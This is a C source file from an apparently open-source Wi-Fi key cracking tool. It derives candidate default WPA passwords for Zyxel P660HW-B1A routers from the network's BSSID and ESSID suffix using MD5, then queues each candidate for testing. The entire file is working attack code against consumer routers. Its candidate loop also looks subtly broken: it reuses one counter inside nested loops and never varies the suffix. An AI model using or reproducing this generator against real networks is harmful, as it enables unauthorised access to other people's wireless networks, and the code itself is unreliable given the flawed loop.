/*********************************************************************************
 * Copyright (c) 2009, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <string.h>
#include <ctype.h>

#include "includes/main.h"
#include "includes/ciphers.h"
#include "includes/algorithms.h"
#include "algorithms/zyxel.h"

static void zyxel_md5_algorithm ( struct crackdata *crack , int suffix )
{
    unsigned char   *tmp;
    unsigned char   passwd[14];
    unsigned char   pwd[33];
    unsigned int    i;

    snprintf ( (char*)passwd, sizeof ( passwd ), "%c%c%c%c%c%c%c%c%hx", crack->net->bssid[0], crack->net->bssid[1], crack->net->bssid[3], crack->net->bssid[4], crack->net->bssid[6], crack->net->bssid[7], crack->net->bssid[9], crack->net->bssid[10], suffix );
    for ( i = 0; passwd[i] != 0 && i < sizeof ( passwd ); i++ )
        passwd[i] = tolower ( passwd[i] );
    get_md5sum((char*)passwd,strlen((const char*)passwd),(char*)pwd,20);
    for ( i = 0; pwd[i] != 0; i++ )
        pwd[i] = toupper ( pwd[i] );

    tmp = (unsigned char*) strdup ( (char*) pwd );
    cbuffer_write(crack->buffer,(void*)tmp);

    for ( i = 0 ; i < 0xFF && !crack->net->pwd.checked ; i++ )
    {
        snprintf ( (char*)passwd, sizeof ( passwd ), "%c%c%c%c%c%c%c%c%hx", crack->net->bssid[0], crack->net->bssid[1], crack->net->bssid[3], crack->net->bssid[4], crack->net->bssid[6], crack->net->bssid[7], crack->net->bssid[9], crack->net->bssid[10], suffix );
        for ( i = 0; passwd[i] != 0 && i < sizeof ( passwd ); i++ )
            passwd[i] = tolower ( passwd[i] );
        get_md5sum((char*)passwd,strlen((const char*)passwd),(char*)pwd,20);
        for ( i = 0; pwd[i] != 0; i++ )
            pwd[i] = toupper ( pwd[i] );

        tmp = (unsigned char*) strdup ( (char*) pwd );
        cbuffer_write(crack->buffer,(void*)tmp);
    }

    return;
}

void zyxel_pwd ( struct crackdata *crack , unsigned int pattern )
{
    int     avoid = 0;
    char    *p = strstr(crack->net->essid,"_");

    if ( p != 0  && strlen(p) > 1 )
        sscanf ( &p[1] , "%x" , &avoid );

    switch ( pattern )
    {
    case ZYXEL_MODEL_P660HWB1A:
        zyxel_md5_algorithm ( crack , avoid );
        break;
    }

    return;
}
